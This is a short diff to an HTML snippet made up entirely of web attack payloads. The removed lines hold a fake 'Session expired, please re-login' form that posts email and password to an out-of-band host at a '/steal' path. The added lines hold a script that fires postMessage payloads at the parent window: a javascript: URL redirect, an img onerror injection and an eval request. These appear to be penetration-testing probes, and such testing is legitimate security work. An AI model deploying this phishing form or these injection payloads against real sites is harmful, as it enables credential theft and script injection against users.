@@ -1,7 +1,6 @@
-<form action="https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/steal" method="POST" target="_top"
-      style="font-family:Arial">
-  <h2>Session expired. Please re-login.</h2>
-  <input name="email" placeholder="Email"><br>
-  <input name="password" type="password" placeholder="Password"><br>
-  <button type="submit">Login</button>
-</form>
+<script>
+// Spray common postMessage payloads at the parent
+window.parent.postMessage('{"type":"redirect","url":"javascript:alert(1)"}', '*');
+window.parent.postMessage('<img src=x onerror=alert(document.domain)>', '*');
+window.parent.postMessage('{"action":"eval","code":"alert(document.domain)"}', '*');
+</script>
